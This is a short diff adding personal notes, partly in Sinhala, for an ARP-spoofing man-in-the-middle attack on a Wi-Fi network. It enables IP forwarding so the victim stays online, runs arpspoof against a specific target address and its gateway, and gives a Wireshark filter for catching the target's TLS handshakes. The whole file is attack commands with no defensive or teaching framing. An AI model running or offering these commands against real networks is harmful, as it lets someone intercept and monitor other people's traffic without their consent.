@@ -1,0 +1,7 @@
+ip route | grep default //see the interface
+
+sudo sysctl -w net.ipv4.ip_forward=1 //api packect forwading enable karanawa. naththam device ekata internet nathi wenawa
+
+sudo arpspoof -i wlan0 -t 192.168.43.207 192.168.43.1
+
+wifeshark : ip.addr == <target> && tls.handshake.type=1
